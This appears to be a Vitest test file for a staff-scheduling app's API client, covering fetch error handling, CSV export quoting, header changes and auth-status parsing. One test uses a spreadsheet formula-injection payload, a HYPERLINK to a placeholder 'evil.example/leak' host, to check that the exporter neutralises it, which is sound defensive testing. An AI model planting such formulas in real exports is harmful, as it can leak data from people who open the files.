import { describe, it, expect, vi, afterEach } from 'vitest';
import { solveScheduleApi, exportRosterToCsvString, authStatusApi, createEmployeeApi } from './api';
import type { SolveRequest, SolveResponse } from '../types';

const request = { demand_matrix: [], templates: [] } as unknown as SolveRequest;

afterEach(() => {
  vi.restoreAllMocks();
});

describe('solveScheduleApi failure path', () => {
  it('rejects with the real error when the request throws', async () => {
    vi.stubGlobal('fetch', vi.fn().mockRejectedValue(new TypeError('network down')));
    await expect(solveScheduleApi(request)).rejects.toThrow('network down');
  });

  it('rejects with the status code when the response is not OK and has no detail', async () => {
    vi.stubGlobal('fetch', vi.fn().mockResolvedValue({ ok: false, status: 500 }));
    await expect(solveScheduleApi(request)).rejects.toThrow('HTTP 500');
  });

  it('rejects with the backend detail message when the response body has one', async () => {
    vi.stubGlobal(
      'fetch',
      vi.fn().mockResolvedValue({ ok: false, status: 401, json: async () => ({ detail: 'Not logged in' }) })
    );
    await expect(solveScheduleApi(request)).rejects.toThrow('Not logged in');
  });

  it('resolves with the parsed body when the response is OK', async () => {
    const body = { employee_count: 3 };
    vi.stubGlobal('fetch', vi.fn().mockResolvedValue({ ok: true, json: async () => body }));
    await expect(solveScheduleApi(request)).resolves.toEqual(body);
  });
});

describe('exportRosterToCsvString', () => {
  it('quotes commas and doubles quotes in names', () => {
    const days = Array.from({ length: 7 }, () => ({ shift_code: 'OFF' }));
    const solution = {
      roster_lines: [
        {
          line_number: 1,
          cohort_id: 'C1',
          assigned_person: 'Smith, "Jo"',
          qualification_tier: 'Lead',
          hourly_wage: 17.5,
          weekly_hours: 40,
          overtime_hours: 0,
          estimated_weekly_payroll: 700,
          days,
        },
      ],
    } as unknown as SolveResponse;
    const csv = exportRosterToCsvString(solution);
    expect(csv).toContain('"Smith, ""Jo"""');
  });

  it('neutralizes a formula-shaped employee name so Excel/Sheets cannot run it on open', () => {
    const days = Array.from({ length: 7 }, () => ({ shift_code: 'OFF' }));
    const solution = {
      roster_lines: [
        {
          line_number: 1,
          cohort_id: 'C1',
          assigned_person: '=HYPERLINK("http://evil.example/leak","click")',
          qualification_tier: '+1;@SUM(A1)',
          hourly_wage: 17.5,
          weekly_hours: 40,
          overtime_hours: 0,
          estimated_weekly_payroll: 700,
          days,
        },
      ],
    } as unknown as SolveResponse;
    const csv = exportRosterToCsvString(solution);
    // Guarded with a leading single quote, and never present as a raw formula cell.
    expect(csv).toContain("'=HYPERLINK");
    expect(csv).toContain("'+1;@SUM(A1)");
    expect(csv).not.toContain(',=HYPERLINK');
    expect(csv).not.toContain(',+1;@SUM');
  });
});

describe('requests no longer carry the retired X-API-Key header', () => {
  it('sends only a JSON content type when saving a staff member', async () => {
    const fetchMock = vi.fn().mockResolvedValue({ ok: true, json: async () => ({ id: 'EMP-1' }) });
    vi.stubGlobal('fetch', fetchMock);
    await createEmployeeApi('FAC-OMAHA-01', { name: 'Pat' });
    const init = fetchMock.mock.calls[0][1] as { headers: Record<string, string> };
    expect(init.headers).toEqual({ 'Content-Type': 'application/json' });
  });
});

describe('authStatusApi', () => {
  it('passes through whether sign-up is open', async () => {
    vi.stubGlobal(
      'fetch',
      vi.fn().mockResolvedValue({
        ok: true,
        json: async () => ({ login_required: true, logged_in: false, email: null, signup_allowed: false }),
      })
    );
    expect(await authStatusApi()).toEqual({
      login_required: true,
      logged_in: false,
      email: null,
      signup_allowed: false,
    });
  });

  it('treats a server that does not report sign-up as open, so an older backend still shows Create Account', async () => {
    vi.stubGlobal(
      'fetch',
      vi.fn().mockResolvedValue({
        ok: true,
        json: async () => ({ login_required: true, logged_in: false, email: null }),
      })
    );
    expect((await authStatusApi()).signup_allowed).toBe(true);
  });

  it('assumes no login screen is needed when the status call fails', async () => {
    vi.stubGlobal('fetch', vi.fn().mockRejectedValue(new TypeError('offline')));
    const status = await authStatusApi();
    expect(status.login_required).toBe(false);
    expect(status.logged_in).toBe(true);
  });
});
